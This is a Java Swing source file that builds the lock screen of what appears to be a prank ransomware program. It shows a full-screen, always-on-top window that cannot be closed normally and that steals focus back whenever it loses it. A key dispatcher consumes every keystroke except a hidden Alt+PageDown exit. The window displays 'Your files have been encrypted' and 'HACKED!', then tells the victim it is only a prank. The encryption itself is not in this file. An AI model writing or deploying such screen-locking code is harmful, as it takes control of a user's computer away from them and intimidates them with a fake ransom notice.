package net.benjaminguzman;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.border.LineBorder;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowFocusListener;
import java.io.IOException;
import java.io.InputStream;

public class MainFrame extends JFrame
{
	private final int CLOSE_KEY = KeyEvent.VK_PAGE_DOWN;
	private final Color bgColor = Color.BLACK;//new Color(55, 128, 173);

	public MainFrame() throws HeadlessException
	{
		super();
		setExtendedState(JFrame.MAXIMIZED_BOTH);
		setUndecorated(true);
		setAlwaysOnTop(true);
		setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		setAutoRequestFocus(true);
		addWindowFocusListener(new AlwaysOnTop(this));

		setBackground(bgColor);
	}

	public void initComponents()
	{
		if (CLOSE_KEY != 0)
			KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
				if (e.getExtendedKeyCode() == CLOSE_KEY && e.isAltDown())
					MainFrame.this.dispose();
				return true;
			});

		JRootPane root = this.getRootPane();
		root.setLayout(new GridBagLayout());
		JPanel panel = new JPanel();
		panel.setBackground(bgColor);
		panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));

		// component creation//

		// jester icon
		JLabel iconLabel = new JLabelC("HACKED! MUAHAHAHA");
		try (InputStream is = this.getClass().getResourceAsStream("resources/jester.png")) {
			assert is != null;
			iconLabel.setIcon(new ImageIcon(ImageIO.read(is)));
			iconLabel.setVerticalTextPosition(SwingConstants.BOTTOM);
			iconLabel.setHorizontalTextPosition(SwingConstants.CENTER);
		} catch (IOException | NullPointerException e) {
			e.printStackTrace();
		}

		// quote
		JLabel quoteLabel = new JLabelC(
			"<html><center>Live as if you were to die tomorrow.<br/>" +
				"Learn as if you were to live forever</center></html>"
		);
		quoteLabel.setFont(new Font("Monospaced", Font.PLAIN, 15));
		quoteLabel.setForeground(Color.WHITE);

		panel.add(Box.createVerticalGlue());
		panel.add(createStatusPanel());
		panel.add(Box.createVerticalGlue());
		panel.add(iconLabel);
		panel.add(Box.createVerticalGlue());
		panel.add(quoteLabel);
		panel.add(Box.createVerticalGlue());

		GridBagConstraints gbc = new GridBagConstraints();
		gbc.fill = GridBagConstraints.VERTICAL;
		gbc.weighty = 1;
		root.add(panel, gbc);
		pack();
		setVisible(true);
	}

	private JPanel createStatusPanel() {
		JPanel panel = new JPanel();
		panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));

		// Your files have been encrypted
		JLabel filesEncryptedLabel = new JLabelC(
			"<html><center>Your files have been encrypted</center></html>"
		);
		filesEncryptedLabel.setFont(new Font("Monospaced", Font.BOLD, 25));
		filesEncryptedLabel.setForeground(Color.RED);

		// it's just prank
		JLabel keepCalmLabel = new JLabelC(
			"<html><center>" +
				"Keep calm. This is not a really harmful software<br/><br/>" +
				"You <font color='red'>don't have to pay anything</font><br/><br/>" +
				"Just take this lesson to <font color='red'>improve your security</font><br/><br/>" +
				"It's easy to decrypt your files, but you should figure that out by yourself" +
				"</center></html>"
		);
		keepCalmLabel.setForeground(Color.LIGHT_GRAY);

		panel.setBackground(bgColor);
		panel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));

		panel.add(filesEncryptedLabel);
		panel.add(Box.createVerticalStrut(15));
		panel.add(keepCalmLabel);

		return panel;
	}

	private JPanel createButtonsPanel() {
		JPanel panel = new JPanel();
		panel.setLayout(new FlowLayout());



//		panel.add(filesEncryptedLabel);
//		panel.add(keepCalmLabel);

		return panel;
	}

	public static class AlwaysOnTop implements WindowFocusListener
	{
		private final JFrame frame;

		public AlwaysOnTop(JFrame frame)
		{
			this.frame = frame;
		}

		@Override
		public void windowGainedFocus(WindowEvent e)
		{

		}

		@Override
		public void windowLostFocus(WindowEvent e)
		{
			frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
			frame.setVisible(true);
			frame.setAlwaysOnTop(true);
			frame.toFront();
			frame.requestFocus();
		}
	}
}
